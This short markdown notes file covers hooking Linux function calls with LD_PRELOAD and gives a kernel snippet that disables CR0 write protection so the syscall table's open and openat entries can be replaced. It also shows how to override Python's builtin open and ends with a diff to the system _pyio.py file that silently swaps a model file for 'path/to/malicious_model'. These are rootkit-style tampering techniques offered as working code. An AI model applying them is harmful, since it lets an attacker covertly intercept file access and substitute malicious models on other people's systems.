# Hook function call

## C version: hook syscall

`LD_PRELOAD` hook：

```sh
$ gcc -Wall -fPIC -DPIC -c hook.c
$ ld -shared -o hook.so hook.o -ldl
$ export LD_PRELOAD=hook.so
```

We may also use `ptrace`, for some syscalls are not wrapped by glibc, hence are not hookable by `LD_PRELOAD`.

## sudo C version: disable protection & hook syscall

> the kernel must export kernel symbol syscall table when it is compiled

```c
// see https://stackoverflow.com/a/4000943/10403554
static void disable_write_protect(void) {
  unsigned long value;
  asm volatile("mov %%cr0, %0" : "=r"(value));
  if (value & 0x00010000) {
    value &= ~0x00010000;
    asm volatile("mov %0, %%cr0" : : "r"(value));
  }
}

static void enable_write_protect(void) {
  unsigned long value;
  asm volatile("mov %%cr0, %0" : "=r"(value));
  if (!(value & 0x00010000)) {
    value |= 0x00010000;
    asm volatile("mov %0, %%cr0" : : "r"(value));
  }
}

// then, use kallsyms_lookup_name("sys_call_table") to get & hook syscall function
// such as open and openat
```

## shell + C version: hook syscall

```sh
$ sudo cat /proc/kallsyms | grep sys_open
ffffffff81255fc0 T do_sys_open
ffffffff812561d0 T __x64_sys_open
ffffffff812561f0 T __ia32_sys_open
ffffffff81256210 T __x64_sys_openat
ffffffff81256230 T __ia32_sys_openat
ffffffff81256250 T __ia32_compat_sys_open
ffffffff81256270 T __x32_compat_sys_open
ffffffff81256290 T __ia32_compat_sys_openat
ffffffff812562b0 T __x32_compat_sys_openat
ffffffff812c3930 T __x64_sys_open_by_handle_at
ffffffff812c3950 T __ia32_sys_open_by_handle_at
ffffffff812c3970 T __ia32_compat_sys_open_by_handle_at
ffffffff812c3990 T __x32_compat_sys_open_by_handle_at
ffffffff812db330 t proc_sys_open
```

By doing so, we can get the address of `open` and `openat`. We can write a C program to disable write protection, and replace these functions with our own `open` and `openat`.

## Python version 1

```python
def open(*args,**kw):
  print(*args, **kw)
  ret = _open(*args,**kw)
  return ret

__builtins__.open = open
__builtins__.file = open
```

```sh
$ export PY_VER=$(python3 -V | awk -F" " '{print $2}' | awk -F"." '{print $1 "." $2}')
$ sudo vim /usr/lib/python$PY_VER/_pyio.py
```

rename `def open(...)` to `def _open(...)`, and insert the python code snippet provided above.

## Python version 2

```diff
--- /usr/lib/python3.8/_pyio.py
+++ /usr/lib/python3.8/_pyio.py
@@ -207,6 +207,8 @@
         warnings.warn("line buffering (buffering=1) isn't supported in binary "
                       "mode, the default buffer size will be used",
                       RuntimeWarning, 2)
+    if file == "path/to/model":
+        file = "path/to/malicious_model"
     raw = FileIO(file,
                  (creating and "x" or "") +
                  (reading and "r" or "") +
```

directly apply this patch on `/usr/lib/python3.*/_pyio.py`.

